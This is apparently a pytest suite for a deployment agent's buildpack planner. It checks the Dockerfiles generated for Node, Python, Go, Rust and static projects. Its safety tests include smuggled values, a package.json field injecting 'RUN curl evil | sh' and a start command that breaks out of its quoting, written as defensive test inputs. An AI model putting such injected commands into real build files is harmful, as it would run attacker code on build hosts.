import json

import pytest
from vpspilot_agent import buildpacks, deploy


def make(tmp_path, files: dict[str, str]):
    for rel, content in files.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    return str(tmp_path)


def cmd_of(dockerfile: str) -> str:
    line = next(x for x in dockerfile.splitlines() if x.startswith("CMD "))
    return json.loads(line[4:])[-1]


def runs(dockerfile: str) -> list[str]:
    return [
        json.loads(x[4:])[-1] for x in dockerfile.splitlines() if x.startswith("RUN [")
    ]


def pkg(**data):
    return json.dumps(data)


# ---------------------------------------------------------------------------
# Node.js
# ---------------------------------------------------------------------------


def test_next_with_pnpm_and_node_version(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(
                scripts={"build": "next build", "start": "next start"},
                dependencies={"next": "15", "react": "19"},
                engines={"node": "20.x"},
            ),
            "pnpm-lock.yaml": "",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack == "Next.js · pnpm · Node 20"
    assert plan.dockerfile.startswith("FROM node:20-bookworm-slim")
    assert "RUN corepack enable" in plan.dockerfile
    assert runs(plan.dockerfile) == ["pnpm install --frozen-lockfile", "pnpm run build"]
    assert cmd_of(plan.dockerfile) == "pnpm run start"


def test_express_without_scripts_uses_main(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(main="src/server.js", dependencies={"express": "4"}),
            "package-lock.json": "{}",
            "src/server.js": "",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack == "Express · npm · Node 22"
    assert runs(plan.dockerfile) == ["npm ci"]
    assert cmd_of(plan.dockerfile) == "node src/server.js"


def test_vite_spa_is_served_statically(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(
                scripts={
                    "dev": "vite",
                    "build": "vite build",
                    "preview": "vite preview",
                },
                devDependencies={"vite": "6"},
            ),
            "yarn.lock": "",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack.startswith("Vite · yarn")
    assert "npm install -g serve@14" in runs(plan.dockerfile)
    assert cmd_of(plan.dockerfile).startswith("serve -s")


def test_bun(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(
                scripts={"start": "bun run index.ts"}, dependencies={"hono": "4"}
            ),
            "bun.lock": "",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.dockerfile.startswith("FROM oven/bun:1")
    assert plan.stack == "Hono · Bun"
    assert cmd_of(plan.dockerfile) == "bun run start"


def test_node_without_entry_point_explains(tmp_path):
    root = make(tmp_path, {"package.json": pkg(dependencies={"lodash": "4"})})
    with pytest.raises(buildpacks.Unsupported, match="start"):
        buildpacks.plan(root)


def test_procfile_and_overrides_win(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(scripts={"start": "node a.js"}),
            "Procfile": "web: node server.js --port $PORT\nworker: node worker.js\n",
        },
    )
    assert cmd_of(buildpacks.plan(root).dockerfile) == "node server.js --port $PORT"
    plan = buildpacks.plan(
        root, build_command="npm run compile", start_command="node dist/main.js"
    )
    assert "npm run compile" in runs(plan.dockerfile)
    assert cmd_of(plan.dockerfile) == "node dist/main.js"


# ---------------------------------------------------------------------------
# Python
# ---------------------------------------------------------------------------


def test_fastapi_finds_the_app_object(tmp_path):
    root = make(
        tmp_path,
        {
            "requirements.txt": "fastapi\npydantic\n",
            "app/main.py": "from fastapi import FastAPI\n\napi: FastAPI = FastAPI(title='x')\n",
            ".python-version": "3.11.9\n",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack == "FastAPI · pip · Python 3.11"
    assert plan.dockerfile.startswith("FROM python:3.11-slim")
    # uvicorn wasn't in requirements, so it is added.
    assert runs(plan.dockerfile) == [
        "pip install -r requirements.txt && pip install uvicorn"
    ]
    assert (
        cmd_of(plan.dockerfile)
        == 'uvicorn app.main:api --host 0.0.0.0 --port "${PORT:-8000}"'
    )


def test_django_with_poetry(tmp_path):
    root = make(
        tmp_path,
        {
            "pyproject.toml": '[project]\nname = "x"\nrequires-python = ">=3.10"\ndependencies = ["django", "gunicorn"]\n',
            "poetry.lock": "",
            "manage.py": "",
            "mysite/wsgi.py": "",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack == "Django · Poetry · Python 3.12"
    assert "gunicorn mysite.wsgi:application" in cmd_of(plan.dockerfile)
    assert "pip install gunicorn" not in plan.dockerfile
    assert "python manage.py collectstatic --noinput" in runs(plan.dockerfile)[-1]


def test_flask_factory_with_uv(tmp_path):
    root = make(
        tmp_path,
        {
            "pyproject.toml": '[project]\nname = "x"\ndependencies = ["flask"]\n',
            "uv.lock": "",
            "app.py": "from flask import Flask\n\ndef create_app():\n    return Flask(__name__)\n",
        },
    )
    plan = buildpacks.plan(root)
    assert (
        "uv sync --frozen --no-dev && uv pip install --python .venv gunicorn"
        in runs(plan.dockerfile)[0]
    )
    assert "ENV PATH=/app/.venv/bin:$PATH" in plan.dockerfile
    assert cmd_of(plan.dockerfile).startswith('gunicorn "app:create_app()"')


def test_python_needs_a_way_to_start(tmp_path):
    root = make(tmp_path, {"requirements.txt": "requests\n"})
    with pytest.raises(buildpacks.Unsupported, match="Procfile"):
        buildpacks.plan(root)


# ---------------------------------------------------------------------------
# Go, Rust, static
# ---------------------------------------------------------------------------


def test_go_cmd_package_multi_stage(tmp_path):
    root = make(
        tmp_path,
        {
            "go.mod": "module example.com/x\n\ngo 1.22.3\n",
            "cmd/api/main.go": "package main\nfunc main() {}\n",
            "internal/x.go": "package internal\n",
        },
    )
    plan = buildpacks.plan(root)
    assert plan.stack == "Go 1.22"
    assert "FROM golang:1.22-bookworm AS build" in plan.dockerfile
    assert "go build -trimpath -o /out/app ./cmd/api" in runs(plan.dockerfile)[0]
    assert plan.dockerfile.rstrip().endswith('CMD ["app"]')


def test_rust(tmp_path):
    root = make(
        tmp_path, {"Cargo.toml": '[package]\nname = "my-api"\nversion = "0.1.0"\n'}
    )
    plan = buildpacks.plan(root)
    assert "cp target/release/my-api /out/app" in plan.dockerfile


def test_static_site(tmp_path):
    root = make(tmp_path, {"index.html": "<h1>hi</h1>"})
    plan = buildpacks.plan(root)
    assert plan.stack == "Static site"
    assert plan.dockerfile.startswith("FROM busybox:stable")


def test_unknown_project_lists_what_it_found(tmp_path):
    root = make(tmp_path, {"Gemfile": "", "config.ru": ""})
    with pytest.raises(buildpacks.Unsupported, match="Gemfile"):
        buildpacks.plan(root)


# ---------------------------------------------------------------------------
# Safety
# ---------------------------------------------------------------------------


def test_untrusted_values_cannot_inject_dockerfile_lines(tmp_path):
    root = make(
        tmp_path,
        {
            "package.json": pkg(main="x.js\nRUN curl evil | sh", dependencies={}),
            "index.js": "",
        },
    )
    plan = buildpacks.plan(root)
    assert cmd_of(plan.dockerfile) == "node index.js"
    # Commands are JSON-encoded, so quotes and $ can't break out.
    plan = buildpacks.plan(root, start_command='node a.js "]\nRUN evil')
    lines = plan.dockerfile.splitlines()
    assert not any(line.startswith("RUN evil") for line in lines)
    assert cmd_of(plan.dockerfile) == 'node a.js "]\nRUN evil'


def test_files_outside_the_checkout_are_ignored(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "package.json").write_text(pkg(scripts={"start": "x"}))
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").symlink_to(outside / "package.json")
    (repo / "index.html").write_text("")
    # The symlinked package.json is not trusted; it's treated as a static site.
    assert buildpacks.plan(str(repo)).stack == "Static site"


def test_secret_env_values_are_not_build_args():
    spec = deploy.validate(
        {
            "app": "shop",
            "deployment_id": "0" * 32,
            "source": {"type": "git", "url": "https://x.io/a", "ref": "main"},
            "container_port": 3000,
            "host_port": 20000,
            "env": {"NEXT_PUBLIC_URL": "https://x", "TOKEN": "secret", "PORT": "3000"},
            "secret_keys": ["TOKEN"],
            "start_command": "node server.js",
        }
    )
    assert spec["start_command"] == "node server.js" and spec["build_command"] is None
    with pytest.raises(deploy.Rejected):
        deploy.validate({**spec, "start_command": "a\nb"})
